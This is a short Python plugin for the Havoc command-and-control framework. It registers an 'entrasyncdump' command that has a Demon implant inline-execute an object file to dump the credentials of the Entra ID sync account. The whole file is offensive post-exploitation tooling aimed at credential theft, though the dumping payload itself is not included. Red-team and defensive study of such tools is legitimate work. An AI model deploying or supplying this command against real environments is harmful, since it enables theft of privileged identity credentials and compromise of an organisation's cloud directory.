from havoc import Demon, RegisterCommand


def entrasyncdump(demon_id, *param):
    """Tasks the demon to dump credentials of the Entra ID sync account"""
    demon = Demon(demon_id)
    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked demon to dump EntraSync credentials")
    demon.InlineExecute(task_id, "go", f"entrasyncdump.{demon.ProcessArch}.o", b"", False)

    return task_id


RegisterCommand(entrasyncdump, "", "entrasyncdump", "Dump credentials of the EntraSync account", 0, "", "")
